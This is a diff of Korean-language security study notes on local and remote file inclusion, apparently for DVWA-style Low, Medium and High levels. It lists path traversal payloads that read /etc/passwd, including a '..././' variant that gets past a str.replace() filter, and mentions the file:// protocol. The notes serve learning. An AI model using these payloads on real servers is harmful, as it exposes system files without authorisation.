@@ -240,9 +240,9 @@ generateSessionToken();
 웹 어플리케이션에 파일을 불러들이는 기능이 존재할때 서버 내부의 임의의 파일을 불러올 수 있으면 *LFI 취약점*이 있다. 서버 외부의 파일을 불러올 수 있으면 *RFI 취약점*이 있다. 특정 Window 혹은 Linux에 대한 공격을 대상으로 하고 있다.
 
 
-=file1.php
+`page=file1.php`
 ```php 
--- 기본 구조
+//기본 구조
 ../
 ..\
 .././../
@@ -250,10 +250,13 @@ generateSessionToken();
 --Low 
 ../../../../../../../etc/passwd
 
---Medium ..././..././..././..././..././..././..././etc/passwd
-ㄴsolve (str.replace()함수 우회)
+Medium ..././..././..././..././..././..././..././etc/passwd
+//solve (str.replace()함수 우회)
 
 --High
+
+//$file, 'include.php' string 값 차단
+// file:// -> php에 내재된 Local file 접근 프로토콜
 
 
 =https:/txt
